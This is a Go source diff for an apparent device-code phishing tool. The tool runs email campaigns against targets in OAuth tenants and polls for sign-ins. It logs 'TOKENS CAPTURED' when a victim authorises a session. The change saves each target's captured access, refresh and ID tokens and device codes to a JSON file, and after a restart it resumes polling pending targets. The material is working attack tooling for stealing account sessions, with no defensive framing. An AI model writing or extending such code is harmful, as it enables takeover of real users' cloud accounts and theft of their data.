@@ -67,6 +67,126 @@ var (
 	dcNextTgt   = 1
 )
 
+const dcStateFile = "dc_state.json"
+
+// dcTargetJSON is a serialisable snapshot of DCTarget (no mutex / unexported fields).
+type dcTargetJSON struct {
+	ID                      int       `json:"id"`
+	CampaignID              int       `json:"campaign_id"`
+	Email                   string    `json:"email"`
+	Tenant                  string    `json:"tenant"`
+	LandingToken            string    `json:"landing_token"`
+	UserCode                string    `json:"user_code"`
+	VerificationURI         string    `json:"verification_uri"`
+	VerificationURIComplete string    `json:"verification_uri_complete"`
+	ExpiresIn               int       `json:"expires_in"`
+	StartedAt               time.Time `json:"started_at"`
+	Status                  string    `json:"status"`
+	AccessToken             string    `json:"access_token"`
+	RefreshToken            string    `json:"refresh_token"`
+	IDToken                 string    `json:"id_token"`
+	DeviceCode              string    `json:"device_code"`
+	Interval                int       `json:"interval"`
+}
+
+// saveDCState writes all targets to dc_state.json. Must be called with dcMu held OR after locking.
+func saveDCState() {
+	dcMu.Lock()
+	defer dcMu.Unlock()
+	saveDCStateLocked()
+}
+
+func saveDCStateLocked() {
+	var snap []dcTargetJSON
+	for _, t := range dcTargets {
+		t.mu.Lock()
+		snap = append(snap, dcTargetJSON{
+			ID:                      t.ID,
+			CampaignID:              t.CampaignID,
+			Email:                   t.Email,
+			Tenant:                  t.Tenant,
+			LandingToken:            t.LandingToken,
+			UserCode:                t.UserCode,
+			VerificationURI:         t.VerificationURI,
+			VerificationURIComplete: t.VerificationURIComplete,
+			ExpiresIn:               t.ExpiresIn,
+			StartedAt:               t.StartedAt,
+			Status:                  t.Status,
+			AccessToken:             t.AccessToken,
+			RefreshToken:            t.RefreshToken,
+			IDToken:                 t.IDToken,
+			DeviceCode:              t.deviceCode,
+			Interval:                t.interval,
+		})
+		t.mu.Unlock()
+	}
+	b, _ := json.MarshalIndent(snap, "", "  ")
+	os.WriteFile(dcStateFile, b, 0600)
+}
+
+// LoadDCState loads dc_state.json on startup and restores targets.
+// Targets that are still pending and not expired will resume polling.
+func LoadDCState() {
+	raw, err := os.ReadFile(dcStateFile)
+	if err != nil {
+		return // no saved state yet
+	}
+	var snap []dcTargetJSON
+	if err := json.Unmarshal(raw, &snap); err != nil {
+		log.Warning("dc_state.json parse error: %v", err)
+		return
+	}
+
+	dcMu.Lock()
+	for _, s := range snap {
+		// avoid duplicate IDs on re-load
+		dup := false
+		for _, existing := range dcTargets {
+			if existing.LandingToken == s.LandingToken {
+				dup = true
+				break
+			}
+		}
+		if dup {
+			continue
+		}
+		t := &DCTarget{
+			ID:                      s.ID,
+			CampaignID:              s.CampaignID,
+			Email:                   s.Email,
+			Tenant:                  s.Tenant,
+			LandingToken:            s.LandingToken,
+			UserCode:                s.UserCode,
+			VerificationURI:         s.VerificationURI,
+			VerificationURIComplete: s.VerificationURIComplete,
+			ExpiresIn:               s.ExpiresIn,
+			StartedAt:               s.StartedAt,
+			Status:                  s.Status,
+			AccessToken:             s.AccessToken,
+			RefreshToken:            s.RefreshToken,
+			IDToken:                 s.IDToken,
+			deviceCode:              s.DeviceCode,
+			interval:                s.Interval,
+		}
+		if t.ID >= dcNextTgt {
+			dcNextTgt = t.ID + 1
+		}
+		dcTargets = append(dcTargets, t)
+
+		// Resume polling if still pending and not expired
+		if t.Status == "pending" {
+			deadline := t.StartedAt.Add(time.Duration(t.ExpiresIn) * time.Second)
+			if time.Now().Before(deadline) {
+				go t.poll()
+			} else {
+				t.Status = "expired"
+			}
+		}
+	}
+	dcMu.Unlock()
+	log.Info("dc: loaded %d targets from %s", len(snap), dcStateFile)
+}
+
 // GlobalDCCfg is set from main so the device code sender can reach SMTP config.
 var GlobalDCCfg *Config
 
@@ -82,6 +202,7 @@ func StartDeviceCode(tenantOrEmail string) (*DCTarget, error) {
 	}
 	dcMu.Lock()
 	dcTargets = append(dcTargets, tgt)
+	saveDCStateLocked()
 	dcMu.Unlock()
 	go tgt.poll()
 	return tgt, nil
@@ -116,6 +237,7 @@ func LaunchCampaign(name, template string, emails []string) (*DCCampaign, error)
 		dcMu.Lock()
 		camp.Targets = append(camp.Targets, tgt)
 		dcTargets = append(dcTargets, tgt)
+		saveDCStateLocked()
 		dcMu.Unlock()
 
 		go tgt.poll()
@@ -288,6 +410,7 @@ func (s *DCTarget) poll() {
 			log.Success("dc [#%d] %s: TOKENS CAPTURED", s.ID, s.Email)
 			log.Info("  access_token : %s...", trunc(tok.AccessToken, 60))
 			log.Info("  refresh_token: %s...", trunc(tok.RefreshToken, 60))
+			saveDCState()
 			dcNotify(s)
 			return
 		default:
@@ -304,6 +427,7 @@ func (s *DCTarget) setStatus(st string) {
 	s.mu.Lock()
 	s.Status = st
 	s.mu.Unlock()
+	saveDCState()
 }
 
 func (s *DCTarget) GetStatus() string {
